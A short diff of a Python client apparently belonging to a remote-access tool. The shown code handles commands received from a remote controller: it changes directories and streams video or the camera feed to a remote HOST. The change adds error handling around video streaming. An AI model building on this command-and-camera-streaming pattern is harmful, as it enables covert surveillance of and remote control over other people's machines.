@@ -29,14 +29,16 @@ def connection():
                     if data.split(' ')[0] == 'cd':
                         os.chdir(data.split(' ')[1])
                     else:
-                        if data == 'start video':
-                            client1 = VideoClient(HOST, 9999, 'video.mp4')
-                            client1.start_stream()
-                            continue
+                        try:
+                            if data == 'start video':
+                                client1 = VideoClient(HOST, 9999, 'video.mp4')
+                                client1.start_stream()
+                        except Exception as e:
+                            print('*'*60 + f'\n{e}\n' + '*'*60)
+
 
                         if data == 'stop video':
                             client1.stop_stream()
-                            continue
 
                         if data == 'start camera':
                             client2 = CameraClient(HOST, 9999)
